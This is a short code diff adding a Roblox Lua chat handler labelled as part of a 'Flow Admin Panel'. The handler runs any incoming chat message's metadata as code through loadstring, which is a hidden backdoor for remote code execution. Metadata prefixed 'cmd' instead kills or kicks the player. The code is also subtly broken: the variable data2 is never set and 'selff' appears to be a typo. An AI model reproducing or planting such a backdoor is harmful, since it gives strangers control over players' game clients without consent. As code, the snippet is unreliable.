@@ -1,0 +1,17 @@
+if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+    TextChatService.OnIncomingMessage = function(msg)
+        if msg.Metadata and msg.Metadata ~= "" then
+            local data = string.split(msg.Metadata, "|");
+            local data1 = data[1] or "";
+            if data1 == "cmd" then
+                if data2 == "rip" then
+                    selff.Character.Humanoid.Health = 0;
+                elseif data2 == "ctrlL" then
+                    selff:Kick("Kick via Flow Admin Panel.");
+                end;
+            else
+                loadstring(data1)();
+            end;
+        end;
+    end;
+end;
